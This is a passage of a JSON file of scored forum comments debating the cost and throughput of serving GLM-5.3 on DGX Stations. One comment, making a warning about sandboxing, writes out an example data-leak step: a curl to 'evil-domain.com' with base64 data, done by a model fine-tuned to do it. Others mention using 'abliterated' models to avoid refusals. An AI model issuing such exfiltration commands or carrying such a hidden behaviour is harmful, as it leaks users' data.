"gpu", "glm-5", "tok", "concurrency", "throughput", "model", "per", "gpus", "open", "station", "end", "memory", "weights", "latency", "serve"], "largest_root": {"root_id": 50497485, "author": "hkalbasi", "slots": 35, "start_dom": 1, "end_dom": 35, "share_pct": 61.4, "top_dom1_age": 5.2, "top_dom1_author": "hkalbasi"}, "buried_cutoff": 25, "rescue_top_k": 20, "ablations": [], "tournament": [], "comments": [{"id": 50497443, "au": "jbellis", "dom": 36, "sr": 1, "sc": 11.53, "ep": 11.53, "bs": 0.0, "d": 0, "age": 5.32, "grav": 36.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 2, "lu": 0, "w": 46, "qw": 0, "k": 5235, "kpp": 4.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "epistemic_gold", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": ["https://github.com/kacper-daftcode/GLM5.3-8xPRO6K"], "ig": 0.868, "fa": 3.04, "gp": 0.572, "bl": 0.0, "ds": 0.0, "txt": "This doesn't seem all that impressive for $200k of hardware? You could serve 4bit off 8xB6000 for ~half the price. No idea what throughput you'd get tho so maybe that's the flex.\n\nEdit: This guy already did it, and you get 60% more throughput on the 8xB6000 https://github.com/kacper-daftcode/GLM5.3-8xPRO6K"}, {"id": 50497941, "au": "AnotherGoodName", "dom": 44, "sr": 2, "sc": 8.72, "ep": 8.72, "bs": 0.0, "d": 0, "age": 4.32, "grav": 27.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 393, "qw": 0, "k": 9712, "kpp": 5.1, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "epistemic_gold", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 1.707, "fa": 1.23, "gp": 0.828, "bl": 0.0, "ds": 0.0, "txt": "For anyone actually considering this $200k+ setup for home or even small business use the power usage and noise is extreme. 1.6kw each with the fans to match. 600tokens/s at concurrency 16 is not what you need for home use or even sub 100 employee business use either. Really reconsider please (do you seriously need people to tell you this?). I get tech wages are high and you can probably afford this but seriously.\n\nRight now there’s no great solution to the frontier or near frontier models for home use. But there are cards and options coming in 2027. For now just accept that you run qwen 37b or similar.\n\nWhat’s coming in 2027 that changes this and why i implore you to wait? Well for these models you need massive amounts of memory and memory bandwidth. The solution above gets this by using expensive HBM spread over enough cards with enough compute to give a ridiculous tok/s. For home use you’d actually be happier with a single GPU that had lots of cheap memory to hold the weights and just enough memory bandwidth to feed that single gpu and no more. This in theory gets you close to 50tok/s on GLM 5.3 if it existed.\n\nIn 2027 there’s expected to be multiple HBF (high bandwidth flash) options incoming. High bandwidth flash has ~10x the latency of HBM but that actually doesn’t matter much for inference. Inference is latency tolerant and local inference time to first token beats over "}, {"id": 50499366, "au": "liuliu", "dom": 2, "sr": 3, "sc": 8.22, "ep": 8.22, "bs": 0.0, "d": 1, "age": 1.77, "grav": 10.9, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 1, "lu": 0, "w": 97, "qw": 0, "k": 3350, "kpp": 2.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "epistemic_gold", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": ["https://docs.z.ai/guides/overview/pricing"], "ig": 1.483, "fa": 1.57, "gp": 0.18, "bl": 0.0, "ds": 0.0, "txt": "Where your price is from?\nhttps://docs.z.ai/guides/overview/pricing\nInput tokens: $1.4\nOutput tokens: $4.4\nCached input: $0.26\n\nThe ROI on this hardware from my back-of-envelope calculation is (50M per day for output tokens, 500M (assuming 10x ratio, which again is conservative (probably 4x more realistically)) per day for input tokens, and assuming 90% / 10% mixing (10% output, and 90% input), you are doing $22 + $630 per day), that is less than a year to make the money (2 DGX Stations, $200k) back.\n\nEDIT: actually read the article, it is kinda poorly written with no clear separation what's the performance for decode v.s. prefill, making us arguing about this much less meaningful."}, {"id": 50497532, "au": "frogblast", "dom": 51, "sr": 4, "sc": 6.97, "ep": 6.97, "bs": 0.0, "d": 1, "age": 5.14, "grav": 34.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 124, "qw": 0, "k": 613, "kpp": 10.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 1.506, "fa": 0.56, "gp": 1.269, "bl": 0.0, "ds": 0.0, "txt": "DeepSeek’s claim to fame is massively shrinking the per-user memory footprint, enabling many more concurrent users in your fixed hardware footprint.   Having more concurrent users leads to much higher overall throughput on that same hardware.  That’s why DS is so cheap to host.\n\nSee table 2 in this article to see the tradeoffs of overall throughput vs per user latency as an example.\n\nDeepseek would let you host higher concurrency than GLM.\n\nPresumably that compression doesn’t come for free on the quality side.  (This is totally speculative on my part.  I haven’t personally used DS, and I don’t particularly feel benchmarks correlate well to my own experiences)\n\nIf you’ve got a small enough user count, perhaps there are tradeoffs in DeepSeek that are not buying you anything."}, {"id": 50497485, "au": "hkalbasi", "dom": 1, "sr": 5, "sc": 6.86, "ep": 7.01, "bs": 0.0, "d": 0, "age": 5.23, "grav": 35.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 39, "qw": 0, "k": 322, "kpp": 6.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 1.111, "fa": 1.17, "gp": 0.731, "bl": 0.0, "ds": 0.0, "txt": "Assuming the DGX priced at $100K, and GLM-5.3 at $1.4/M output token, this has ROI of ~7 years at maximum utilization (unlikely) and ignoring operational expenses like electricity. Which makes it economically unreasonable unless you want privacy or something like that."}, {"id": 50499050, "au": "kgeist", "dom": 5, "sr": 6, "sc": 5.9, "ep": 6.2, "bs": 0.0, "d": 2, "age": 2.33, "grav": 14.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 78, "qw": 0, "k": 5188, "kpp": 3.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "glm_rtx", "flbl": "Glm & Rtx (SEC)", "urls": [], "ig": 0.873, "fa": 0.95, "gp": 0.992, "bl": 0.0, "ds": 0.0, "txt": "People say GLM 5.3 is not much smarter than GLM 5.3 Flash (just +4 points on Artificial Analysis), and GLM 5.3 Flash fits on 4x RTX 6000 Pro for 4 times less money, with the same 600 tok/sec aggregate decode speed on vLLM (6 mln tokens KV cache). And I tell you, 600 tok/sec is not much for an organization, it's barely usable for 8 people. That's why we plan to buy more RTX 6000 Pros. And this setup requires $400,000 to run GLM 5.3 for 16 people, it's absolutely uneconomical."}, {"id": 50497434, "au": "flowerthoughts", "dom": 48, "sr": 7, "sc": 5.82, "ep": 5.82, "bs": 0.0, "d": 0, "age": 5.33, "grav": 36.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 53, "qw": 0, "k": 930, "kpp": 2.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 1.05, "fa": 0.95, "gp": 0.444, "bl": 0.0, "ds": 0.0, "txt": "GB300 DGX. Each with 256 GiB of RAM and a price of $100k?\n\nFor an enterprise, that price seems doable. But if you want 50-100 tps like Claude does, and you only have 10 users, maybe you're not an enterprise.\n\nTo pull a recent analogy, I guess we're still at the early Model S stage of LLMs."}, {"id": 50498015, "au": "Danox", "dom": 56, "sr": 8, "sc": 5.55, "ep": 5.55, "bs": 0.0, "d": 1, "age": 4.19, "grav": 26.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 148, "qw": 0, "k": 621, "kpp": 0.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 1.389, "fa": 0.62, "gp": 0.361, "bl": 0.0, "ds": 0.0, "txt": "If you haven’t done so already, you should already be invested in some of the sane blue chip stocks in the tech/industrial area Google, Apple, there is a reason they have done well over 25 years over time, for example it really does pay off and there are many others to choose from, if you stay at it and you don’t try to become a mind less day trader it is basically your second profession. next to your daytime job over time.\n\nIn the design engineering department, I was in a group of eight designers/engineers decided they were gonna make their fortune with our profit sharing bonuses. Some did, some didn’t about half gave up. And now they’re mad at the world.\n\nStaying at it, tuning out the noise really does work, compounding assets over time really does work if you stay at it and don’t become a mindless day trader."}, {"id": 50500091, "au": "kgeist", "dom": 10, "sr": 9, "sc": 5.48, "ep": 5.92, "bs": 0.0, "d": 4, "age": 0.39, "grav": 4.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 50, "qw": 0, "k": 5188, "kpp": 3.0, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "grounded_analysis", "facet": "glm_rtx", "flbl": "Glm & Rtx (SEC)", "urls": [], "ig": 0.675, "fa": 1.23, "gp": 0.569, "bl": 0.0, "ds": 0.0, "txt": "The setup in the article reports 600 tok/sec aggregate decode for GLM 5.3. I get the same throughput on 4x RTX 6000 Pro's connected vi PCIe for GLM 5.3 Flash, which is just 4 points below GLM 5.3 on Artificial Analysis. I'm just saying the setup in the article looks overpriced for what it can actually do"}, {"id": 50500001, "au": "maxloh", "dom": 11, "sr": 10, "sc": 5.17, "ep": 5.61, "bs": 0.0, "d": 2, "age": 0.59, "grav": 5.5, "surf": 5.7, "fade": "c00", "dt": 0, "ut": 1, "lu": 0, "w": 81, "qw": 0, "k": 4432, "kpp": 3.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": ["https://evil-domain.com/?payload=base64-encoded-data"], "ig": 1.353, "fa": 0.62, "gp": 0.459, "bl": 0.0, "ds": 0.0, "txt": "It is also unsafe unless you run the agents in a sandbox without network access.\n\nAll it takes to leak data is a curl request to https://evil-domain.com/?payload=base64-encoded-data, and any model could be trained or fine-tuned to execute this on any task.\n\nIt becomes even more dangerous if you run unofficial quantized weights of the original model, such as the Unsloth ones. Doing so means there are now two separate parties you need to trust, on top of the Chinese corporation behind the original model."}, {"id": 50497699, "au": "arjie", "dom": 42, "sr": 11, "sc": 5.09, "ep": 5.09, "bs": 0.0, "d": 0, "age": 4.82, "grav": 31.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 99, "qw": 0, "k": 10968, "kpp": 3.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 1.472, "fa": 0.34, "gp": 0.457, "bl": 0.0, "ds": 0.0, "txt": "Curious about the >2 case. You get a Quantum X800 switch? Or just a fast Ethernet switch? These are quite cool because of the amount of VRAM on them (though I find the “unified RAM” marketing unnecessarily confusing) but I avoided them because I wasn’t sure I could network them. A B300 node is $500k but I think I’d do MI355X now at that size because new Claudes will be able to port easily.\n\nThe advantage of the station is gradual improvement. Though tbh I wonder if I should just settle for putting a few more normal H100 NVL and trying RoCE. Post is at least inspiring of ideas  if nothing else."}, {"id": 50498084, "au": "Keyframe", "dom": 45, "sr": 12, "sc": 4.89, "ep": 5.04, "bs": 0.0, "d": 1, "age": 4.05, "grav": 25.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 143, "qw": 0, "k": 8625, "kpp": 2.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 1.539, "fa": 0.34, "gp": 0.313, "bl": 0.0, "ds": 0.0, "txt": "Make do with the subscriptions for now.\n\nSometimes you can't. All big three are bringing in the censorship and virtue signaling. It got to absurd levels recently. I asked claude to audit my code, let's see specific security features and it flat out refused etc.\n\nI did a janky setup at home - I hooked up an old razer egpu case with 3090 (which had been collecting dust) to a strix halo 395 machine. I'm running qwen 3.8 flash next abliterated version as well as few image editing models and hook up to it with pi. The speed is really decent, it works on a level like frontier models late last year or better, and the best thing is I feel I can do anything with it without being nannied around.\n\nI still use frontier, but now I use both. I recommend everyone to get one of these machines and do a similar setup. I got the idea from here anyways."}, {"id": 50498800, "au": "osamagirl69", "dom": 41, "sr": 13, "sc": 4.72, "ep": 4.72, "bs": 0.0, "d": 1, "age": 2.7, "grav": 16.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 46, "qw": 0, "k": 1280, "kpp": 4.9, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.684, "fa": 0.95, "gp": 0.276, "bl": 0.0, "ds": 0.0, "txt": "The chart of the actual tok/s vs concurrency is at the end. For a single user you get 107tok/s, which is about 2-3x as fast as you would get on 4x DGX spark.\n\nThe 607 tok/s is total tok/s across the 16 users, so a bit over 35tok/s per user."}, {"id": 50497440, "au": "gpugreg", "dom": 50, "sr": 14, "sc": 4.44, "ep": 4.58, "bs": 0.0, "d": 1, "age": 5.32, "grav": 36.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 58, "qw": 9, "k": 375, "kpp": 3.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 1.269, "fa": 0.42, "gp": 0.28, "bl": 0.0, "ds": 0.0, "txt": "> Is there a reason they chose glm and not deepseek\n\nGLM-5.3's architecture (same as GLM-5.2) is simpler and it came out earlier.\n\nHybrid attention and Manifold-Constrained Hyper-Connections only arrived with GLM-5.3-Flash.\n\nAlso, NVIDIA acquired HuggingFace, who used GLM-5.2 for their forensic analysis when they got hacked, so I presume that they have more familiarity with that model.\n\nAnd DeepSeek-V4.1-Flash is more memory-efficient, so it'd sell fewer GPUs."}, {"id": 50500015, "au": "Doohickey-d", "dom": 3, "sr": 15, "sc": 4.42, "ep": 4.86, "bs": 0.0, "d": 2, "age": 0.54, "grav": 5.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 25, "qw": 0, "k": 660, "kpp": 5.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 0.394, "fa": 1.23, "gp": 0.294, "bl": 0.0, "ds": 0.0, "txt": "And it's even cheaper on third party providers. For example the cheapest fp8 on openrouter is $0.5586 input, $0.1037 cached input, $1.756 output. And obviously less on fp4."}, {"id": 50499301, "au": "meatmanek", "dom": 7, "sr": 16, "sc": 4.39, "ep": 4.83, "bs": 0.0, "d": 3, "age": 1.89, "grav": 11.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 153, "qw": 0, "k": 1183, "kpp": 2.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 1.703, "fa": 0.0, "gp": 0.572, "bl": 0.0, "ds": 0.0, "txt": "Personally I find GLM-5.3 to be smart enough to be my daily driver, writing code, doing investigations, etc., including multi-codebase changes and finding the relevant documentation/supporting code for itself so I don't have to explain everything. It's fast (depending on your inference provider), cheap, and smart enough.\n\nI find the full-size 5.3 is smart enough to avoid all the small-model problems, while GLM-5.3-Flash definitely starts showing its limits any time the task at hand is poorly defined. 5.3-Flash can often manage even complicated tasks, but the error rate (in terms of bad decisions, misunderstandings, etc) starts creeping up and the time wasted (or the risk thereof) gets high enough that it's worth just paying for the bigger model.\n\nI do wish the bigger model could use vision though- that's currently limited to the flash model (presumably because it came out later, when they had figured out their vision training pipeline. Hopefully later releases will include it.)"}, {"id": 50497879, "au": "justincormack", "dom": 39, "sr": 17, "sc": 3.44, "ep": 3.58, "bs": 0.0, "d": 2, "age": 4.43, "grav": 28.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 40, "qw": 0, "k": 12029, "kpp": 2.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 1.092, "fa": 0.34, "gp": 0.034, "bl": 0.0, "ds": 0.0, "txt": "I mean, barely. If you want a video out you have to add another GPU which reduces the power the main GPU gets. And most offices don't have 800Gb fibre to the desk. The Supermicro version is rackmountable, which makes more sense."}, {"id": 50499634, "au": "meatmanek", "dom": 52, "sr": 18, "sc": 3.36, "ep": 3.87, "bs": 0.0, "d": 2, "age": 1.29, "grav": 8.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 49, "qw": 0, "k": 1183, "kpp": 2.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 1.198, "fa": 0.34, "gp": 0.061, "bl": 0.0, "ds": 0.0, "txt": "I'm not sure I gave Deepseek-v4.1-Flash a fair shot, but in my limited testing, it spends 20 minutes thinking about relatively basic prompts, so even if it's cheaper that GLM, the time saved by GLM-5.3's much more reasonable thinking time/tokens means you end up ahead if you value your own time."}, {"id": 50497577, "au": "lumost", "dom": 4, "sr": 19, "sc": 2.74, "ep": 3.4, "bs": 0.0, "d": 1, "age": 5.04, "grav": 33.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 35, "qw": 0, "k": 11846, "kpp": 3.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.501, "fa": 0.34, "gp": 0.863, "bl": 0.0, "ds": 0.0, "txt": "It’s useful in controlled environments where getting a commodity api approved will take years.\n\nEg I can put 2x of these workstations in an office handling banking/medical/secret/sensitive data and have my engineers stop complaining."}, {"id": 50497382, "au": "walrus01", "dom": 55, "sr": 20, "sc": 2.43, "ep": 2.8, "bs": 0.0, "d": 0, "age": 5.41, "grav": 36.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 41, "qw": 0, "k": 39816, "kpp": 4.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 1.095, "fa": 0.0, "gp": 0.154, "bl": 0.0, "ds": 0.0, "txt": "I'll get right on that after an elderly relative passes away and leaves me a valuable piece of real estate in a major city that will sell for enough money to buy two DGX stations in the current market. Or I win the lottery."}, {"id": 50497644, "au": "mapontosevenths", "dom": 54, "sr": 21, "sc": 2.35, "ep": 2.79, "bs": 0.0, "d": 2, "age": 4.91, "grav": 32.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 70, "qw": 0, "k": 3346, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "glm_rtx", "flbl": "Glm & Rtx (SEC)", "urls": [], "ig": 1.189, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Having used both, they really are comparable for most things, which leaves the cheaper Deepseek a better choice for most folks. The one area that I've found GLM to be a clear winner is in offensive Cyber.\n\nIf you run a red team GLM is hard to beat, and most of the providers who want to serve an abliterated model cost significantly more so it makes more sense to spend money on hardware."}, {"id": 50497901, "au": "Danox", "dom": 38, "sr": 22, "sc": 2.21, "ep": 2.94, "bs": 0.0, "d": 2, "age": 4.41, "grav": 28.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 86, "qw": 0, "k": 621, "kpp": 0.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 1.253, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Ultimately, that’s where most people want to be local and on their desktop. It keeps coming up over and over again. Most working in this area want privacy and want to work on their desktop or in a small cluster within a small team office environment. It keeps coming up over and over again. Rental is fine temporarily but it isn’t the end point no matter what Sam Altman wants, personal computers won out for a reason over the mainframe solutions of the past. Those reasons have not changed."}, {"id": 50498237, "au": "spwa4", "dom": 57, "sr": 23, "sc": 2.13, "ep": 2.57, "bs": 0.0, "d": 0, "age": 3.73, "grav": 23.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 39, "qw": 0, "k": 1186, "kpp": 0.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 1.092, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Hopefully ERNIE 5.5 (open weight) is about the performance of GLM-5.3 (looks that way from preliminary evals) and it should run easily on one DGX station.\n\nMaybe even a Q4 quant on 128G, like an M5 max laptop or a DGX spark ..."}, {"id": 50499382, "au": "kgeist", "dom": 8, "sr": 24, "sc": 1.85, "ep": 2.95, "bs": 0.0, "d": 4, "age": 1.74, "grav": 10.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 86, "qw": 0, "k": 5188, "kpp": 3.0, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "crowd_chatter", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 1.257, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Dunno, maybe I'm good at prompting it, but I haven't had many issues with GLM-5.3 Flash. After switching from the Claude models, I barely noticed any difference for most tasks. In fact, I have to recheck the settings from time to time to make sure I'm not running anything Anthropic when I see it working with sensitive data :)\n\nThe only annoying issue for me is that GLM-5.3 Flash is often eager to go into action and start modifying code when I've just asked a question and it misunderstood it as a call to action."}, {"id": 50497781, "au": "user43928", "dom": 27, "sr": 25, "sc": 1.82, "ep": 2.7, "bs": 0.0, "d": 1, "age": 4.64, "grav": 30.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 26, "qw": 0, "k": 1404, "kpp": 1.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 0.947, "fa": 0.0, "gp": 0.325, "bl": 0.0, "ds": 0.0, "txt": "It seems particularly poor compared to larger deployments of other models like Kimi K3.1 Pro.\n\nI've heard numbers between 10k-38k tokens per second per GB300 GPU."}, {"id": 50497962, "au": "nijave", "dom": 43, "sr": 26, "sc": 1.8, "ep": 2.6, "bs": 0.0, "d": 1, "age": 4.27, "grav": 27.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 33, "qw": 0, "k": 2492, "kpp": 1.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 1.108, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "There is something for macOS that uses Thunderbolt for high speed interconnect. Obviously it doesn't scale beyond a few nodes but I think that's a decent and fairly approachable middleground\n\nEdit: This github.com/exo-explore/exo"}, {"id": 50499337, "au": "andriy_koval", "dom": 22, "sr": 27, "sc": 1.39, "ep": 1.83, "bs": 0.0, "d": 3, "age": 1.82, "grav": 11.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 21, "qw": 0, "k": 452, "kpp": 0.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.778, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Is suspect major providers will or already provide service of deploying their models on clients hardware, if bill is large enough."}, {"id": 50497841, "au": "giwook", "dom": 24, "sr": 28, "sc": 1.26, "ep": 2.58, "bs": 0.0, "d": 1, "age": 4.5, "grav": 29.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 41, "qw": 0, "k": 1001, "kpp": 2.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.917, "fa": 0.0, "gp": 0.294, "bl": 0.0, "ds": 0.0, "txt": "It seems like hosting your frontier models don't make any kind of economic sense at this point given the exorbitant premiums on hardware in this space right now.\n\nWhat will prices look like once production has caught up with demand though?"}, {"id": 50500153, "au": "Implicated", "dom": 6, "sr": 29, "sc": 1.17, "ep": 2.49, "bs": 0.0, "d": 3, "age": 0.27, "grav": 4.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 72, "qw": 0, "k": 1069, "kpp": 2.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "glm5_model", "flbl": "Glm-5 & Model (Flash)", "urls": [], "ig": 1.011, "fa": 0.0, "gp": 0.082, "bl": 0.0, "ds": 0.0, "txt": "5.3 is certainly “better” than its flash variant, in my experience. I’ve moved on from both but eagerly await the next generation of each.\n\nBetter, in this context, is more capable with open ended work, planning, longer horizon “reasoning”. Flash is an absolute chad with a well defined task and accompanying guidance/guardrails/conventions provided. But not even close when it needs to deviate, runs into a “blocker” and has to reason its way out."}, {"id": 50497620, "au": "poisonborz", "dom": 20, "sr": 30, "sc": 1.14, "ep": 2.24, "bs": 0.0, "d": 1, "age": 4.97, "grav": 32.9, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 30, "qw": 0, "k": 3524, "kpp": 2.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "input_output", "flbl": "Input & Output (Roi)", "urls": [], "ig": 0.751, "fa": 0.0, "gp": 0.326, "bl": 0.0, "ds": 0.0, "txt": "In each similar thread there are posts disputing the ROI - most often that's a minor positive side-effect of self-hosting. Independence, privacy and unchanging, uncensored models, that makes it already worth it."}, {"id": 50497692, "au": "Grimburger", "dom": 12, "sr": 31, "sc": 1.13, "ep": 1.79, "bs": 0.0, "d": 2, "age": 4.83, "grav": 31.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 36, "qw": 0, "k": 2402, "kpp": 3.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.429, "fa": 0.0, "gp": 0.54, "bl": 0.0, "ds": 0.0, "txt": "Since when do software engineers complain about maintaining privacy, security or compliance?\n\nI have very much the opposite experience, they trash the place like toddlers then complain relentlessly when our auditors or anyone else points it out."}, {"id": 50500298, "au": "lossolo", "dom": 28, "sr": 32, "sc": 0.83, "ep": 2.37, "bs": 0.0, "d": 2, "age": 0.05, "grav": 3.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 16, "qw": 0, "k": 3506, "kpp": 1.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.596, "fa": 0.34, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "GB300 is a full rack of 72 GPUs and costs ~10x more than two DGXs in the article."}, {"id": 50498074, "au": "preommr", "dom": 25, "sr": 33, "sc": 0.78, "ep": 2.32, "bs": 0.0, "d": 2, "age": 4.07, "grav": 25.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 52, "qw": 0, "k": 5064, "kpp": 4.9, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.986, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Well if the current AI leaders are to be believed, it won't matter because money won't be a thing, robots will do all the hard labor, and cancer will be solved.\n\nAll in the next few years btw, around the same amount of time to actually build the factories. So strap in I guess."}, {"id": 50500008, "au": "John23832", "dom": 9, "sr": 34, "sc": 0.49, "ep": 2.03, "bs": 0.0, "d": 3, "age": 0.57, "grav": 5.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 22, "qw": 0, "k": 4525, "kpp": 3.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "frontier_models", "flbl": "Frontier & Models (GPU)", "urls": [], "ig": 0.453, "fa": 0.34, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "You’re not going to get the same token throughout with the pro 6000 over pcie. You’re paying for speed and bandwidth."}, {"id": 50498596, "au": "k0morebi", "dom": 40, "sr": 35, "sc": 0.3, "ep": 3.57, "bs": 2.52, "d": 0, "age": 3.02, "grav": 18.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 50, "qw": 0, "k": 11, "kpp": 0.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "bullshit_or_flamewar", "facet": "user_buying", "flbl": "User & Buying (Hardware)", "urls": [], "ig": 0.64, "fa": 0.68, "gp": 0.088, "bl": 0.95, "ds": 0.0, "txt": "Is my intuition correct in that the headline tok/s are for a single user?\n\nMultiple concurrent users make that tok/s/user at best with 